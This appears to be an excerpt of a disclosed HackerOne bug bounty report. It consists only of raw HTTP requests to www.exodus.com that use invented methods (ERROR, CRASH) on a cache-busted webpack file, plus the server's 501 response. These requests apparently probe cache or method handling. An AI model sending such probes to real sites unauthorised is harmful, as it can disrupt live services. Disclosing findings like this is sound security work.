Source: `hackerone/reports/2022/1581454.md` (https://hackerone.com/reports/1581454)

```
ERROR /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```

```
CRASH /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```

```
HTTP/1.1 501 Not Implemented
Date: Wed, 25 May 2022 22:07:00 GMT
Content-Length: 0
Connection: keep-alive
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Set-Cookie: __cfruid=5132a5357442dd861d107824c86a39a95057bcaf-1653516420; path=/; domain=.exodus.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
CF-RAY: 711194da3f3fa131-SIN
```

